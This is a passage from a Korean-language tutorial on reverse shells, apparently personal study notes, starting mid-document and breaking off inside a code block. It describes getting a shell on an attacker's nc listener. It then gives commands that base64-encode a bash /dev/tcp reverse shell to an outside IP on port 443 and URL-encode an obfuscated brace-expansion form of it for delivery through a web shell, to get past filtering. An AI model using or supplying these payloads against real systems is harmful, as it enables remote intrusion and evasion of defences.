...
```
![img_3.png](img/리버스쉘/img_3.png)

연결이 성공하면 공격 서버의 `nc` 리스너에서 쉘이 획득된다.
![img_1.png](img/리버스쉘/img_1.png)

### 웹쉘로 실행할 경우 우회 페이로드 생성하여 리버스쉘 실행
```bash
# 공격자 PC에서 실행하여 페이로드 생성
1. echo "bash -i >& /dev/tcp/16.16.170.38/443 0>&1" | base64

## 1에서 생성 값을 파이썬으로 url 인코딩해야한다
2. python3 -c "import urllib.parse; print(urllib.parse.quote('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNi4xNi4xNzAuMzgvNDQzIDA+JjEK}|{base64,-d}|{bash,-i}'))"
